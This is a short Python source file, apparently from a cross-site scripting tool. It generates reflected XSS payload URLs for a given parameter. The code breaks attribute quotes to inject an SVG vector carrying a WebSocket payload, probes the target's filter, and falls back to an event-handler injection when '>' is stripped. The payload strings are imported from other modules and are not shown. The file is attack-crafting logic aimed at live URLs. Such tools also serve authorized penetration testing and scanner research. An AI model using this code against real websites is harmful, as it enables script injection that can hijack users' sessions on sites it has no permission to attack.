from config import specialTagAttrs
from payloads import WSpayload, BREAK_DOUBLE_QUOTES, BREAK_SINGLE_QUOTES, SVG_VECTOR, EVENT_HANDLER
from testFilter import testFilter    

def genPayload(ctxt, url, param):
    payload = "" 
    context = ""
    if ctxt.between_or_inside == "<>":
        # try to break context first
        if ctxt.tag_attribute not in specialTagAttrs:
            break_quotes = BREAK_DOUBLE_QUOTES if ctxt.quotes == "\"" else BREAK_SINGLE_QUOTES
            payload = url + "?" + param + "=" + break_quotes + SVG_VECTOR(WSpayload)
            print "Param: {} test filter".format(param)
            filtered = testFilter(url, param, payload)
            # if we can't break tag context
            if ">" in filtered:
                quotes = "\"" if break_quotes == BREAK_DOUBLE_QUOTES else '\''
                payload = url + "?" + param + "=" + quotes + EVENT_HANDLER(WSpayload, ctxt.html_tag)
    return payload